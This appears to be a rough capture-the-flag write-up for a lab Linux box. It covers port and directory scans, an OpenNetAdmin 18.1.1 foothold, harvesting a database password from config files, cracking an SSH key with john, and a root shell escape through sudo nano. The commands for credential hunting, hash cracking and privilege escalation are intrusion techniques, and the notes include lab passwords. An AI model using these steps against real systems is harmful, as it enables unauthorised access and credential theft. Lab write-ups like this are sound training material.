# recon
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
Starting gobuster in directory enumeration mode
===============================================================
/music                (Status: 301) [Size: 314] [--> http://10.129.140.30/music/]
/artwork              (Status: 301) [Size: 316] [--> http://10.129.140.30/artwork/]
/sierra               (Status: 301) [Size: 315] [--> http://10.129.140.30/sierra/]
```

# foothold
Exploit ona 18.1.1 on /music
```
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
```
ss -tunl
```
	tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*     
	tcp    LISTEN   0        128             127.0.0.1:52846          0.0.0.0:* 
```
grep -r password= ./
```
	./include/adodb5/drivers/adodb-postgres64.inc.php:      //      $db->Connect("host=host1 user=user1 password=secret port=4341");4
```
grep -r "db_passwd' =>" -B 3 ./
```
	./local/config/database_settings.inc.php-        'db_type' => 'mysqli',
	./local/config/database_settings.inc.php-        'db_host' => 'localhost',
	./local/config/database_settings.inc.php-        'db_login' => 'ona_sys',
	./local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
## ssh connexion on jimmy with 
```
n1nj4W4rri0R!
```

```
find / -user $USER 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
	/var/www/internal
	/var/www/internal/main.php
	/var/www/internal/logout.php
	/var/www/internal/index.php
```
cat /var/www/internal/index.php
```
	 if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')

I found password hash that we i crack
```
Revealed
```

connect to 127.0.0.1:52846 by proxy chain
connect it using `jimmy:Revealed`
```
ssh2john id > hash
```
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```
	bloodninjas

## ssh connexion to joanna 
```
 ssh joanna@10.129.234.122 -i id 
```
```
sudo -l
```
#ExploitNanoSudo
```
sudo -u root /bin/nano /opt/priv
```
Nano allows inserting external files into the current one using the shortcut Ctrl + R . 

The command reveals that we can [execute system commands](https://gtfobins.github.io/gtfobins/nano/#shell) using ^X . 
Press Ctrl + X and enter the following command to spawn a shell. 
```
reset; sh 1>&0 2>&0
```